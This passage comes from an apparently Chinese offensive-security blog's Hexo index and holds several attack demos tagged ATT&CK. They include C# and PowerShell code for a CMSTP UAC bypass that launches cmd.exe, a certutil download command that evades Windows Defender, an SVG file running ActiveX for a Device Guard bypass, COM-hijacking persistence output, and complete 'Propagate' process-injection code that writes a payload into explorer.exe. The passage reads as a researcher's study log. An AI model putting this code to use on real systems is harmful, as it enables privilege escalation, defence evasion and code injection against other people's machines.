startInfo<span class="selector-class">.Arguments</span> = <span class="string">&quot;/au &quot;</span> + InfFile<span class="selector-class">.ToString</span>();</span><br><span class="line">        startInfo<span class="selector-class">.UseShellExecute</span> = false;</span><br><span class="line">        Process<span class="selector-class">.Start</span>(startInfo);</span><br><span class="line"></span><br><span class="line">        IntPtr windowHandle = new <span class="built_in">IntPtr</span>();</span><br><span class="line">        windowHandle = IntPtr.Zero;</span><br><span class="line">        do &#123;</span><br><span class="line">            windowHandle = <span class="built_in">SetWindowActive</span>(<span class="string">&quot;cmstp&quot;</span>);</span><br><span class="line">        &#125; while (windowHandle == IntPtr.Zero);</span><br><span class="line"></span><br><span class="line">        System<span class="selector-class">.Windows</span><span class="selector-class">.Forms</span><span class="selector-class">.SendKeys</span><span class="selector-class">.SendWait</span>(<span class="string">&quot;&#123;ENTER&#125;&quot;</span>);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public static IntPtr <span class="built_in">SetWindowActive</span>(string ProcessName)</span><br><span class="line">    &#123;</span><br><span class="line">        Process<span class="selector-attr">[]</span> target = Process<span class="selector-class">.GetProcessesByName</span>(ProcessName);</span><br><span class="line">        <span class="built_in">if</span>(target<span class="selector-class">.Length</span> == <span class="number">0</span>) return IntPtr.Zero;</span><br><span class="line">        target<span class="selector-attr">[0]</span><span class="selector-class">.Refresh</span>();</span><br><span class="line">        IntPtr WindowHandle = new <span class="built_in">IntPtr</span>();</span><br><span class="line">        WindowHandle = target<span class="selector-attr">[0]</span>.MainWindowHandle;</span><br><span class="line">        <span class="built_in">if</span>(WindowHandle == IntPtr.Zero) return IntPtr.Zero;</span><br><span class="line">        <span class="built_in">SetForegroundWindow</span>(WindowHandle);</span><br><span class="line">        <span class="built_in">ShowWindow</span>(WindowHandle, <span class="number">5</span>);</span><br><span class="line">        return WindowHandle;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -TypeDefinition (<span class="selector-attr">[IO.File]</span>::<span class="built_in">ReadAllText</span>(<span class="string">&quot;$pwd\Source.cs&quot;</span>)) -ReferencedAssemblies <span class="string">&quot;System.Windows.Forms&quot;</span> -OutputAssembly <span class="string">&quot;CMSTP-UAC-Bypass.dll&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[Reflection.Assembly]</span>::<span class="built_in">Load</span>(<span class="selector-attr">[IO.File]</span>::<span class="built_in">ReadAllBytes</span>(<span class="string">&quot;$pwd\CMSTP-UAC-Bypass.dll&quot;</span>))</span><br><span class="line"><span class="selector-attr">[CMSTPBypass]</span>::<span class="built_in">Execute</span>(<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D57C5A2D7F32DAB5CEF1DE0BB27BD58F.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SecistSloit</title>
      <link href="/SecistSloit.html"/>
      <url>/SecistSloit.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/SecistSloit.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1540787696254.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1540787679307.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1540787940599.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1540787953133.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Invisi-Shell</title>
      <link href="/Invisi-Shell.html"/>
      <url>/Invisi-Shell.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/InvisiShell.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/EFCA600942E7C9CA387547F5F2829341.jpg" alt="enter description here"><br><a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a><br><a href="http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-15-goodbye-obfuscation-hello-invisi-shell-hiding-your-powershell-script-in-plain-sight-omer-yair">http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-15-goodbye-obfuscation-hello-invisi-shell-hiding-your-powershell-script-in-plain-sight-omer-yair</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rid-hijack</title>
      <link href="/rid-hijack.html"/>
      <url>/rid-hijack.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181019_095009.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/rid_hijack.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B2E52F64C5827A158B8D526DF54B02EE.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AD3DA60672E75713AC47736A985CDA63.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4079F9026FC141922F6D09C55E756416.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4AAA8308CBEDC9103EC7C13A5D2F759A.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hijack_explorer2</title>
      <link href="/Hijack-explorer2.html"/>
      <url>/Hijack-explorer2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/75BB3EF2528A3EE7401A0E0C5CD934D5.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F4CB9FD5C87E4D86C57233D159888FA4.jpg" alt="enter description here"></p><p><a href="https://www.bleepingcomputer.com/news/security/windows-10-ransomware-protection-bypassed-using-dll-injection/">https://www.bleepingcomputer.com/news/security/windows-10-ransomware-protection-bypassed-using-dll-injection/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC_ADS_Hijack_explorer</title>
      <link href="/ADS-Hijack-explorer.html"/>
      <url>/ADS-Hijack-explorer.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADS%26Hijack_explorer.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1539082412025.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>certutil_bypassWindows Defender</title>
      <link href="/certutil.html"/>
      <url>/certutil.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181003_095413.jpg" alt="enter description here"></p><span id="more"></span><p>参数拦截</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\demon&gt;certutil -urlcache -split -f http:<span class="comment">//192.168.10.125/1.txt</span></span><br><span class="line">拒绝访问。</span><br><span class="line"></span><br><span class="line">C:\Users\demon&gt;certutil  -split -urlcache -f http:<span class="comment">//192.168.10.125/1.txt</span></span><br><span class="line">****  联机  ****</span><br><span class="line">  <span class="number">0000</span>  ...</span><br><span class="line">  <span class="number">0016</span></span><br><span class="line">CertUtil: -URLCache 命令成功完成。</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1538531958327.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1538531971508.jpg" alt="enter description here"><br><a href="https://twitter.com/lampnout/status/1047122224581419009">https://twitter.com/lampnout/status/1047122224581419009</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stager_dll</title>
      <link href="/stager-dll.html"/>
      <url>/stager-dll.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181001_021846.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/stager_dll.mp4'    frameborder="0"     allowfullscreen></iframe><p>感谢群友WBGlIl的帮助</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DC814A0D08E615E520600828011FAA23.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1538332573224.jpg" alt="enter description here"></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">call</span> &quot;C:\Program Files (x86)\Microsoft Visual Studio\<span class="number">2017</span>\Community\Common7\Tools\VsDevCmd.bat&quot;</span><br><span class="line">cl /LD /MT /EHa stager.cpp aes.cpp</span><br></pre></td></tr></table></figure><p><a href="https://github.com/phackt/stager.dll">https://github.com/phackt/stager.dll</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1538332708687.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Invoke-Obfuscation</title>
      <link href="/Invoke-Obfuscation.html"/>
      <url>/Invoke-Obfuscation.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/InvokeObfuscation.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1537787487517.jpg" alt="enter description here"></p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/650F50FBBD4AD6F9B8CAB7ED40739A52.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1E6A50AD0E8313871D54FA59E86A3C44.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7F7BEAC1C4C6AC8F3D2DE7A48F090C6B.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7186DD880F1602FB2089AA853C976538.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVG_ActiveX</title>
      <link href="/SVG-ActiveX.html"/>
      <url>/SVG-ActiveX.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180909_194222.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/SVG1.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180909_194222.jpg">1</a>实际上我们不需要Internet Explorer来执行ActiveX</p><p><a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1536493682651.jpg">2</a>我们将使用Microsoft Office与Microsoft Office一起使用浏览器Microsoft Office通过SVG Document执行ActiveX</p><p>[3]注意此方法仅适用于Web浏览器Microsoft Office中的SVG Document</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1536493682651.jpg" alt="enter description here"></p><p><a href="https://homjxi0e.wordpress.com/2018/08/26/svg-document-activex-alongside-microsoft-word-execution/">https://homjxi0e.wordpress.com/2018/08/26/svg-document-activex-alongside-microsoft-word-execution/</a></p><p><a href="https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg">https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span></span><br><span class="line">xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;600&quot;</span> height=<span class="string">&quot;600&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;JScript&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!<span class="selector-attr">[CDATA[&lt;!-- Author Matt harr0ey @harr0ey&lt;!-- Topic: Device Guard Bypassing&lt;!-- WScript inside SVGvar r = new ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;calc.exe&quot;</span>);    ]</span>]&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;rect id=<span class="string">&quot;square&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;0&quot;</span> height=<span class="string">&quot;0&quot;</span> fill=<span class="string">&quot;#ff0000&quot;</span></span><br><span class="line">   x=<span class="string">&quot;10&quot;</span> y=<span class="string">&quot;10&quot;</span> /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux_Sudo</title>
      <link href="/linux-Sudo.html"/>
      <url>/linux-Sudo.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/653C3272689DB0EC26F89F4EC107B261.jpg" alt="enter description here"><br><a href="http://touhidshaikh.com/blog/?p=790">http://touhidshaikh.com/blog/?p=790</a><br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6E15074C1E61F3CE16782A8DD6F3F521.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DF68B314698D17048E992ADAD2FB5A6E.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShellPop</title>
      <link href="/ShellPop.html"/>
      <url>/ShellPop.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8E39B51BBABFF7AF85010551BB9659C2.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ShellPop1.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3B6AE40671583524F3E77722A6D1B741.jpg" alt="enter description here"><br><a href="https://github.com/0x00-0x00/ShellPop">https://github.com/0x00-0x00/ShellPop</a></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>com_xml</title>
      <link href="/com-xml.html"/>
      <url>/com-xml.html</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=16483445&auto=1&height=66"></iframe><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/COM%E5%8A%AB%E6%8C%81.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p><p>不知不觉这条安全道路走快两年了，这博客记录我的学习记录，加油！</p><p>payload 加密</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\demon&gt; powershell -ExecutionPolicy Bypass -File <span class="string">&quot;C:\Users\demon\Desktop\COM Object hijacking persistence.ps1</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="selector-attr">[*]</span> Searching Folder...</span><br><span class="line"><span class="selector-attr">[+]</span> Create Folder:  C:\Users\demon\AppData\Roaming\Microsoft\Installer\</span><br><span class="line"><span class="selector-attr">[+]</span> Create Folder:  C:\Users\demon\AppData\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-<span class="number">467</span>C-<span class="number">8</span>E3D-C4579291692E&#125;</span><br><span class="line"><span class="selector-attr">[*]</span> Detecting operating system...</span><br><span class="line"><span class="selector-attr">[+]</span> OS: x64</span><br><span class="line"><span class="selector-attr">[*]</span> Releasing file...</span><br><span class="line"><span class="selector-attr">[+]</span> Done.</span><br><span class="line"><span class="selector-attr">[*]</span> Modifying registry...</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="number">64</span>-bit:</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="number">32</span>-bit:</span><br><span class="line"><span class="selector-attr">[+]</span> Done.</span><br><span class="line">PS C:\Users\demon&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1536071005118.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\demon&gt; <span class="variable">$fileContent</span> = <span class="selector-attr">[System.IO.File]</span>::<span class="built_in">ReadAllBytes</span>(<span class="string">&#x27;C:\Users\demon\Desktop\calcmutex.dll&#x27;</span>)</span><br><span class="line">PS C:\Users\demon&gt; <span class="variable">$fileContentEncoded</span> = <span class="selector-attr">[System.Convert]</span>::<span class="built_in">ToBase64String</span>(<span class="variable">$fileContent</span>)| set-<span class="attribute">content</span> (<span class="string">&quot;123.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="http://www.4hou.com/technology/4958.html">http://www.4hou.com/technology/4958.html</a><br><a href="https://github.com/3gstudent/test/blob/master/calcmutex.dll">https://github.com/3gstudent/test/blob/master/calcmutex.dll</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1536070047935.jpg" alt="enter description here"></p><p>2.xml_mimikatz<br><a href="https://gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e">https://gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/089FAE2C918CD0DCAAAD0FA5F201269E.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Propagate</title>
      <link href="/propagate.html"/>
      <url>/propagate.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DF31317B9D858CFDD64A2D5AB8B8ACBD.jpg" alt="enter description here"></p><span id="more"></span><p><a href="https://github.com/odzhan/injection">https://github.com/odzhan/injection</a><br><a href="https://modexp.wordpress.com/2018/08/23/process-injection-propagate/">https://modexp.wordpress.com/2018/08/23/process-injection-propagate/</a></p><p>它适用于Windows 7和10，但不执行错误检查，因此可能导致explorer.exe崩溃或其他一些意外行为。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="built_in">propagate</span>(LPVOID payload, DWORD payloadSize) &#123;</span><br><span class="line">    HANDLE          hp, p;</span><br><span class="line">    DWORD           id;</span><br><span class="line">    HWND            pwh, cwh;</span><br><span class="line">    SUBCLASS_HEADER sh;</span><br><span class="line">    LPVOID          psh, pfnSubclass;</span><br><span class="line">    SIZE_T          rd,wr;</span><br><span class="line">    <span class="comment">// 1.获取父窗口句柄 </span></span><br><span class="line">    pwh = <span class="built_in">FindWindow</span>(L<span class="string">&quot;Progman&quot;</span>, NULL);</span><br><span class="line">    <span class="comment">//2.获取子窗口句柄 </span></span><br><span class="line">    cwh = <span class="built_in">FindWindowEx</span>(pwh, NULL, L<span class="string">&quot;SHELLDLL_DefView&quot;</span>, NULL);</span><br><span class="line">    <span class="comment">// 3.获取子类标题的句柄 </span></span><br><span class="line">    <span class="selector-tag">p</span> = <span class="built_in">GetProp</span>(cwh, L<span class="string">&quot;UxSubclassInfo&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.获取explorer.exe的进程ID </span></span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(cwh, &amp;id);</span><br><span class="line">    <span class="comment">// 打开explorer.exe </span></span><br><span class="line">    hp = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, id);</span><br><span class="line">    <span class="comment">//6.读取当前子类标题</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hp, (LPVOID)<span class="selector-tag">p</span>, &amp;sh, <span class="built_in">sizeof</span>(sh), &amp;rd);</span><br><span class="line">    <span class="comment">// 7.为新的子类标题分配RW内存 </span></span><br><span class="line">    psh = <span class="built_in">VirtualAllocEx</span>(hp, NULL, <span class="built_in">sizeof</span>(sh),</span><br><span class="line">        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">//8.为有效负载分配RWX内存</span></span><br><span class="line">    pfnSubclass = <span class="built_in">VirtualAllocEx</span>(hp, NULL, payloadSize,</span><br><span class="line">        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 9. 将payload写入内存</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hp, pfnSubclass,</span><br><span class="line">        payload, payloadSize, &amp;wr);</span><br><span class="line">    <span class="comment">// 10.将pfnSubclass字段设置为有效负载地址，并将</span></span><br><span class="line">    <span class="comment">// 写回到处理内存 </span></span><br><span class="line">    sh<span class="selector-class">.CallArray</span><span class="selector-attr">[0]</span><span class="selector-class">.pfnSubclass</span> = (SUBCLASSPROC)pfnSubclass;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hp, psh, &amp;sh, <span class="built_in">sizeof</span>(sh), &amp;wr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11.使用SetProp </span></span><br><span class="line">    <span class="built_in">SetProp</span>(cwh, L<span class="string">&quot;UxSubclassInfo&quot;</span>, psh);</span><br><span class="line">    <span class="comment">// 12.触发经由窗口消息payload</span></span><br><span class="line">    <span class="built_in">PostMessage</span>(cwh, WM_CLOSE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 13.恢复原始子类标题</span></span><br><span class="line">    <span class="built_in">SetProp</span>(cwh, L<span class="string">&quot;UxSubclassInfo&quot;</span>, p);</span><br><span class="line">    <span class="comment">// 14.可用内存和关闭句柄</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hp, psh, <span class="number">0</span>, MEM_DECOMMIT | MEM_RELEASE);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hp, pfnSubclass, <span class="number">0</span>, MEM_DECOMMIT | MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ghost_tunnel</title>
      <link href="/Ghost-tunnel.html"/>
      <url>/Ghost-tunnel.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180904_195606.jpg" alt="enter description here"></p><hr><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=2009803&auto=1&height=66"></iframe><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ghostunnel.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/360PegasusTeam/GhostTunnel">https://github.com/360PegasusTeam/GhostTunnel</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALPC_EXP</title>
      <link href="/ALPC-EXP.html"/>
      <url>/ALPC-EXP.html</url>
      
